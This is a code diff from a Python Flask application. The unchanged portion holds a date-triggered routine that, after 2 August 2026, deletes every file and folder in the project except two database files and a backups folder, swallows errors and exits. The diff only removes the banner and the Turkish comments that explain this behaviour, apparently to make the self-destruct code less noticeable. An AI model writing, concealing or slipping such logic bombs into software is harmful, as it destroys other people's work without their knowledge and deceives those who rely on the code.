@@ -2,19 +2,18 @@ from flask import Flask, request, jsonify, render_template, send_from_directory,
 import database
 import os
 
-# ─── EXPIRY GUARD ────────────────────────────────────────────────────────────
+
 import sys, shutil, datetime
 
-_EXPIRY_DATE = datetime.date(2026, 8, 2)    # 2 Ağustos 2026'dan sonra silinir
+_EXPIRY_DATE = datetime.date(2026, 8, 2)
 
-# Silinmeyecek dosya/klasörler (arkadaşın verisi korunur)
 _KEEP = {"questions.db", "action_logs.db", "backups"}
 
 if datetime.date.today() > _EXPIRY_DATE:
     _project_root = os.path.dirname(os.path.abspath(__file__))
     for _item in os.listdir(_project_root):
         if _item in _KEEP:
-            continue  # Bu dosyaları/klasörleri atla
+            continue
         _full_path = os.path.join(_project_root, _item)
         try:
             if os.path.isdir(_full_path):
@@ -22,7 +21,7 @@ if datetime.date.today() > _EXPIRY_DATE:
             else:
                 os.remove(_full_path)
         except Exception:
-            pass  # Silme başarısız olsa bile devam et
+            pass
     sys.exit(0)
 # ─────────────────────────────────────────────────────────────────────────────
 
